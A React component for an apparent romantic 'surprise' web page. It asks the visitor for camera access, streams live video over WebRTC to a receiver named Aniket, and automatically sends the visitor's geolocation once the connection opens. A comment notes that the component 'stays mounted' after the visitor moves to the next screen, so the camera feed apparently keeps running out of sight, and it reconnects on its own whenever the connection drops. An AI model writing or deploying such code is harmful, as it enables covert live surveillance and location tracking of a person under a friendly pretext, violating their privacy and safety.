"use client"

import { useState, useRef, useEffect } from "react"
import { motion, useAnimation } from "framer-motion"

const ICE_SERVERS = {
  iceServers: [
    { urls: "stun:stun.l.google.com:19302" },
    { urls: "stun:stun1.l.google.com:19302" },
    { urls: "stun:stun2.l.google.com:19302" },
  ]
}

export default function SurpriseFeature({ onNext }) {
  const [stream, setStream] = useState(null)
  const [status, setStatus] = useState("idle")
  const [statusMsg, setStatusMsg] = useState("")
  const [error, setError] = useState(null)
  const [message, setMessage] = useState("")
  const [holdProgress, setHoldProgress] = useState(0)
  const [isHolding, setIsHolding] = useState(false)
  const [hasSentMessage, setHasSentMessage] = useState(false)
  const [timeLeft, setTimeLeft] = useState(30) // 30 seconds

  const videoRef = useRef(null)
  const pcRef = useRef(null)
  const pollingRef = useRef(null)
  const dataChannelRef = useRef(null)
  const holdIntervalRef = useRef(null)

  const log = (msg) => {
    console.log("[Sender]", msg)
    setStatusMsg(msg)
  }

  const connectWebRTC = async (mediaStream) => {
    try {
      await fetch("/api/signal", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ type: "reset" }) })

      if (pcRef.current) pcRef.current.close()

      const pc = new RTCPeerConnection(ICE_SERVERS)
      pcRef.current = pc

      const dc = pc.createDataChannel("chat")
      dataChannelRef.current = dc

      dc.onopen = () => {
        console.log("Data channel opened!")
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition((pos) => {
            dc.send(JSON.stringify({ type: 'location', data: { lat: pos.coords.latitude, lng: pos.coords.longitude } }))
          })
        }
      }

      mediaStream.getTracks().forEach(track => {
        // Prevent adding duplicate tracks if reconnecting
        if (!pc.getSenders().find(s => s.track === track)) {
          pc.addTrack(track, mediaStream)
        }
      })
      log("Camera tracks added")

      pc.onconnectionstatechange = () => {
        if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
          log("Connection lost. Reconnecting...")
          setStatus("connecting")
          clearInterval(pollingRef.current)
          setTimeout(() => connectWebRTC(mediaStream), 1000)
        }
      }

      const offer = await pc.createOffer()
      await pc.setLocalDescription(offer)
      log("Offer created...")

      await new Promise((resolve) => {
        if (pc.iceGatheringState === "complete") {
          resolve()
        } else {
          pc.addEventListener("icegatheringstatechange", () => {
            if (pc.iceGatheringState === "complete") resolve()
          })
          setTimeout(resolve, 4000)
        }
      })

      const completeOffer = pc.localDescription
      await fetch("/api/signal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "offer", data: { sdp: completeOffer.sdp, type: completeOffer.type } })
      })
      log("Waiting for receiver...")

      clearInterval(pollingRef.current)
      pollingRef.current = setInterval(async () => {
        try {
          const res = await fetch("/api/signal?type=answer")
          const { data } = await res.json()
          if (data && pc.remoteDescription === null) {
            clearInterval(pollingRef.current)
            await pc.setRemoteDescription(new RTCSessionDescription(data))
            setStatus("live")
            log("🔴 LIVE")
          }
        } catch (e) {
          console.error("Polling error:", e)
        }
      }, 1000)
    } catch (err) {
      console.error(err)
      setError("Connection failed.")
      setStatus("error")
    }
  }

  const startStream = async () => {
    try {
      setStatus("connecting")
      log("Requesting camera...")

      const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      setStream(mediaStream)
      
      connectWebRTC(mediaStream)
    } catch (err) {
      console.error(err)
      setError("Camera access denied or not available.")
      setStatus("error")
    }
  }

  const sendMessage = () => {
    if (message.trim() && dataChannelRef.current && dataChannelRef.current.readyState === "open") {
      dataChannelRef.current.send(JSON.stringify({ type: 'chat', data: message }))
      setMessage("") // Clear after sending
      setHasSentMessage(true)
    }
  }

  // Handle Hold-to-reveal
  const startHold = () => {
    if (!hasSentMessage) return
    setIsHolding(true)
    holdIntervalRef.current = setInterval(() => {
      setHoldProgress((prev) => {
        if (prev >= 100) {
          clearInterval(holdIntervalRef.current)
          onNext() // Progress to next screen, but component stays mounted!
          return 100
        }
        return prev + (10 / 30000) * 100 // 30 seconds to reach 100%
      })
      setTimeLeft((prev) => {
        const newTime = prev - 0.01 // decrement by 10ms
        return newTime > 0 ? newTime : 0
      })
    }, 10)
  }

  const stopHold = () => {
    setIsHolding(false)
    clearInterval(holdIntervalRef.current)
    setHoldProgress(0) // reset if they let go early
    setTimeLeft(30)
  }

  useEffect(() => {
    if (videoRef.current && stream) {
      videoRef.current.srcObject = stream
    }
  }, [stream])

  useEffect(() => {
    return () => {
      clearInterval(pollingRef.current)
      clearInterval(holdIntervalRef.current)
      if (pcRef.current) pcRef.current.close()
      if (stream) stream.getTracks().forEach(t => t.stop())
    }
  }, [stream])

  if (status === "idle") {
    return (
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center justify-center gap-8 p-8">
        <p className="text-xl text-purple-200 text-center max-w-md">
          I need to see your reaction for this... Please click below and allow camera access!
        </p>
        <button onClick={startStream} className="bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white font-semibold py-4 px-10 rounded-full text-lg shadow-lg hover:shadow-pink-500/40 transition-all hover:scale-105">
          Share Camera & Location 📸
        </button>
      </motion.div>
    )
  }

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center justify-center gap-6 p-4 w-full">
      <div className={`flex items-center gap-2 px-4 py-2 rounded-full border text-sm font-semibold ${status === "live" ? "bg-red-500/20 border-red-500/50 text-red-200 animate-pulse" : "bg-yellow-500/20 border-yellow-500/50 text-yellow-200"}`}>
        <div className={`w-2 h-2 rounded-full ${status === "live" ? "bg-red-500" : "bg-yellow-400 animate-bounce"}`} />
        {status === "live" ? "🔴 LIVE: Sharing with Aniket" : statusMsg || "Connecting..."}
      </div>

      <h2 className="text-3xl text-white font-bold text-center">Look at that beautiful smile! ✨</h2>

      <div className="w-64 h-64 md:w-80 md:h-80 rounded-full overflow-hidden border-4 border-pink-500 shadow-[0_0_30px_rgba(236,72,153,0.6)]">
        <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" style={{ transform: "scaleX(-1)" }} />
      </div>

      <p className="text-pink-300 font-serif italic text-lg text-center max-w-sm mt-2">
        "I love you more than words can say... ❤️"
      </p>

      <div className="flex flex-col w-full max-w-xs gap-2">
        <input 
          type="text" 
          value={message} 
          onChange={(e) => setMessage(e.target.value)}
          placeholder="Send a message to Aniket..." 
          className="px-4 py-2 rounded-full bg-white/10 border border-pink-500/30 text-white focus:outline-none focus:border-pink-500"
        />
        <button 
          onClick={sendMessage}
          className="text-sm text-pink-400 hover:text-pink-300 transition-colors self-end pr-2"
        >
          Send Message ✉️
        </button>
      </div>

      <div className="relative mt-4">
        <button 
          onPointerDown={startHold}
          onPointerUp={stopHold}
          onPointerLeave={stopHold}
          disabled={!hasSentMessage}
          className={`relative overflow-hidden bg-white/10 border border-white/20 text-white font-semibold py-3 px-8 rounded-full transition-all select-none ${!hasSentMessage ? "opacity-50 cursor-not-allowed" : "hover:bg-white/20 cursor-pointer"}`}
        >
          <span className="relative z-10">
            {!hasSentMessage 
              ? "Send a message first!" 
              : isHolding 
                ? `Keep holding... ${Math.ceil(timeLeft)}s` 
                : "Hold for 30 seconds to reveal surprise"}
          </span>
          <div 
            className="absolute top-0 left-0 h-full bg-gradient-to-r from-pink-500 to-purple-600 z-0 transition-all duration-75"
            style={{ width: `${holdProgress}%` }}
          />
        </button>
      </div>

      {error && <p className="text-red-400 text-sm text-center">{error}</p>}
    </motion.div>
  )
}
